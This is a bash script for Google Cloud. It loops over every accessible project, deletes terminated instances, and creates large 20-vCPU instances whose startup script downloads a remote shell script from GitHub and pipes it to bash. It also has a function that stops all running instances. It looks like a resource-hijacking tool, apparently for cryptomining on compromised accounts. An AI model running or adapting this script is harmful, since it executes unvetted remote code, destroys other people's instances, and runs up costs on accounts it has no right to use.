#!/bin/bash
stop_instances (){
for instance in  $(gcloud compute instances list --filter="status=running" --format="value(name)" --quiet)
do
  zone=$(gcloud compute instances list --filter="name=$instance" --format="value(zone)" --quiet)
  status=$(gcloud compute instances describe $instance --zone=$zone --format="value(status)" --quiet)
  created_on=$(gcloud compute instances describe $instance --zone=$zone --format="value(creationTimestamp.date('%Y-%m-%d'))" --quiet)
  gcloud compute instances stop $instance --zone=$zone --async --quiet
done
}

delete_old_instances (){
for terminated_instance in  $(gcloud compute instances list --filter="status=terminated" --format="value(name)" --quiet)
do
  zone=$(gcloud compute instances list --filter="name=$terminated_instance" --format="value(zone)" --quiet)
  status=$(gcloud compute instances describe $terminated_instance --zone=$zone --format="value(status)" --quiet)
  created_on=$(gcloud compute instances describe $terminated_instance --zone=$zone --format="value(creationTimestamp.date('%Y-%m-%d'))" --quiet)
  gcloud compute instances delete $terminated_instance --zone=$zone --quiet
  echo "Delete old " $terminated_instance
done
}

create_instance (){
gcloud beta compute --project=$1 instances create instance-$2 --zone=$3 --machine-type=custom-20-22272 --subnet=default --network-tier=PREMIUM --metadata=startup-script=sudo\ curl\ -s\ -L\ \ https://raw.githubusercontent.com/oldhuman/shameOnYou/master/m.sh\ \|\ bash\ -s --maintenance-policy=MIGRATE --scopes=https://www.googleapis.com/auth/cloud-platform --min-cpu-platform=Intel\ Skylake --image=debian-9-stretch-v20181011  --image-project=debian-cloud --boot-disk-size=10GB --boot-disk-type=pd-standard --boot-disk-device-name=instance-1 --async --quiet
}

instances_count=$(gcloud compute instances list --filter="status=running" --format="value(name)" | wc -l)

#LOGIC
for project in $(gcloud projects list  --format="value(project_id)")
	do
		gcloud config set project $project
		echo "Project: " $project
		delete_old_instances
		i=1
		for zone in "us-central1-b" "europe-north1-c" "us-east1-b"
			do
				create_instance $project $i $zone
				echo "Created instance" $project "instance-"$i $zone
				i=$((i + 1))
			done
	done
exit
